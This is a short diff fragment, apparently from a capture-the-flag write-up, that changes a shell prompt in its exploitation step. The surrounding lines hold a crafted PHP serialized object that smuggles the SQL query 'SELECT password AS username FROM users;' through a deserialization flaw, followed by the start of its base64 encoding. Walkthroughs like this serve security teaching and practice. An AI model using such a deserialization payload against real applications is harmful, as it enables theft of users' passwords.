@@ -150,7 +150,7 @@ So let's go for exploitation:
 
 
 ```bash
-tedsig42@exegol:~$ echo -n 'a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}' | base64
+tedsig42@exegol:~# echo -n 'a:2:{s:2:"ip";s:15:"137.255.127.129";s:7:"exploit";O:3:"SQL":1:{s:5:"query";s:39:"SELECT password AS username FROM users;";s:4:"conn";N;}}' | base64
 
 YToyOntzOjI6ImlwIjtzOjE1OiIxMzcuMjU1LjEyNy4xMjkiO3M6NzoiZXhwbG9pdCI7TzozOiJT
 UUwiOjE6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9N
